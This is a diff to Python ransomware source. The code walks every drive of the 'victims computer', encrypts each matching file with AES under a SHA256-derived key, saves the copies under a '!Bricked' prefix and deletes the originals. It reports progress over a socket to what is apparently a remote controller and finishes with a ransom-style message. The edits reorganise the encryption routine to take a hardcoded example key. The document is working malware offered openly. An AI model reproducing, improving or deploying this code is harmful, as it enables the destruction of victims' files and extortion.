@@ -14,8 +14,11 @@ sysFiles = [] # all of the files found on the machine.
 
 def encrypt(key, filename):
     chunksize = 64 * 1024
-    outFile = os.path.join(os.path.dirname(filename), "[!Bricked]" + os.path.basename(filename))
+    #Encrypt every file with .ext "!Bricked
+    outFile = os.path.join(os.path.dirname(filename), "!Bricked" + os.path.basename(filename))
+    
     filesize = str(os.path.getsize(filename)).zfill(16)
+    
     # Initiialization vector.
     IV = ''
 
@@ -39,8 +42,26 @@ def encrypt(key, filename):
                 outfile.write(encryption.encrypt(chunk))
 
 
+def brickSystem(key):
+    
+    KEY = key
+   
+    discoverFiles() # Find all files
+    
+    ALL_FILES = sysFiles 
 
-# Scout the system, find all files.
+    for target_file in ALL_FILES:
+        if os.path.basename(target_file).startswith("!Bricked"):
+            pass
+        elif target_file == os.path.join(os.getcwd(), sys.argv[0]):
+            pass
+        else:
+            C_socket.send("Encrypting "+str(target_file))
+            encrypt(SHA256.new(KEY).digest(), str(target_file))
+            os.remove(target_file)
+                
+
+# Search every drive on the victims computer. Appending the file to the sysFile total list.
 
 # Replace getcwd with '/root' for linux machines, or traverse all drives for windows machines.
 
@@ -71,22 +92,6 @@ def discoverFiles():
     Search_Y_Drive()
     Search_Z_Drive()
         
-def brickSystem():
-   
-    discoverFiles() # Find all files
-    
-    ALL_FILES = sysFiles 
-
-    for target_file in ALL_FILES:
-        if os.path.basename(target_file).startswith("[!Bricked]"):
-            pass
-        elif target_file == os.path.join(os.getcwd(), sys.argv[0]):
-            pass
-        else:
-            C_socket.send("Encrypting "+str(target_file))
-            encrypt(SHA256.new(KEY).digest(), str(target_file))
-            os.remove(target_file)
-
 
 extensions = [
         # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES ~ ! LETHAL TO ENCRYPT !
@@ -332,8 +337,10 @@ def Search_Z_Drive():
 
 
 def main():
-    brickSystem()
-    Print("Unlucky, your files have been compromised")
+    user_key = "EXAMPLE KEY :)" 
+    brickSystem(user_key)
+    print("Unlucky, your files have been compromised")
+    print(" Just kidding come get the decryptor " )
     
 
 
